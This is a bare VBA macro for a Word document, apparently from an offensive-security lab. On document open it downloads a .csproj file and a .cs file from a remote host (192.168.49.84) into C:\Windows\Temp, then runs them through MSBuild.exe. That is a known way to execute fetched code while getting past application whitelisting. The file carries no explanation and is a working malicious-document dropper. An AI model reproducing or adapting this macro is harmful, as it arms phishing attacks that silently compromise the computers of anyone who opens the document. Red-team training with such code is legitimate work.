Sub MyMacro()
    Dim url As String
    url = "http://192.168.49.84/msbuild_xml.csproj"
    
    Dim WinHttpReq As Object, oStream As Object
    Set WinHttpReq = CreateObject("Msxml2.ServerXMLHTTP")
    WinHttpReq.Open "GET", url, False
    WinHttpReq.send
    
    If WinHttpReq.Status = 200 Then
        Set oStream = CreateObject("ADODB.Stream")
        oStream.Open
        oStream.Type = 1
        oStream.Write WinHttpReq.responseBody
        Dim path As String
        path = "C:\Windows\Temp\msbuild_xml.csproj"
        oStream.SaveToFile path, 2
        oStream.Close
    End If
    
    url = "http://192.168.49.84/msbuild.cs"
    Set WinHttpReq = CreateObject("Msxml2.ServerXMLHTTP")
    WinHttpReq.Open "GET", url, False
    WinHttpReq.send
    
    If WinHttpReq.Status = 200 Then
        Set oStream = CreateObject("ADODB.Stream")
        oStream.Open
        oStream.Type = 1
        oStream.Write WinHttpReq.responseBody
        path = "C:\Windows\Temp\msbuild.cs"
        oStream.SaveToFile path, 2
        oStream.Close
    End If
    
    Dim str As String
    str = "C:\Windows\Microsoft.Net\Framework64\v4.0.30319\MSBuild.exe C:\Windows\Temp\msbuild_xml.csproj"
    Shell str, vbNormalFocus
End Sub

Sub Document_Open()
    MyMacro
End Sub

Sub AutoOpen()
    MyMacro
End Sub
